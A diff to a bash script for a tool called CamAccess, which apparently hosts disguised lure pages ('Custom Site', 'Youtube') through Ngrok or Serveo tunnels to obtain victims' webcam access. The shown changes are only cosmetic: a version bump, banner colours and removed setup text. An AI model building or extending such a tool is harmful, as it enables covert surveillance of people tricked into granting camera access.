@@ -19,7 +19,7 @@ printf "\e[2;92m ┃┃╱╭┫╭╮┃╰╯┃\e[0m\e[2;77m┃╭╮┃╭�
 printf "\e[2;92m ┃╰━╯┃╭╮┃┃┃┃\e[0m\e[2;77m┃╭╮┃╰━┫╰━┫┃━╋━━┣━━┃\e[0m\n"
 
 printf "\e[2;92m ╰━━━┻╯╰┻┻┻╯\e[0m\e[2;77m╰╯╰┻━━┻━━┻━━┻━━┻━━╯\e[0m\n"
-printf " \e[1;93m CamAccess Ver 1.0 \e[0m \n"
+printf " \e[1;93m CamAccess Ver 1.2 \e[0m \n"
 printf " \e[2;77m https://tanjim.ga | Developed by Tanjim Abubokor \e[0m \n"
 
 printf "\n"
@@ -149,17 +149,15 @@ camAccess
 else
 printf "\n-----Choose a template----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Custom Site \e[0m\n"
-
-printf "\n@Please read first.\n"
-printf "\n At first you have to edit file called customsite.html
- Type nano customsite.html And paste your site source code.\n"
+ 
+ 
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Youtube \e[0m\n"
 
 default_option_template="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
 if [[ $option_tem -eq 1 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Press enter to the process
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;2m] Press enter to continue the process
  \e[0m' fest_name
 fest_name="${fest_name//[[:space:]]/}"
 elif [[ $option_tem -eq 2 ]]; then
@@ -251,7 +249,7 @@ fi
 
 printf "\n-----Choose tunnel server----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[3;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
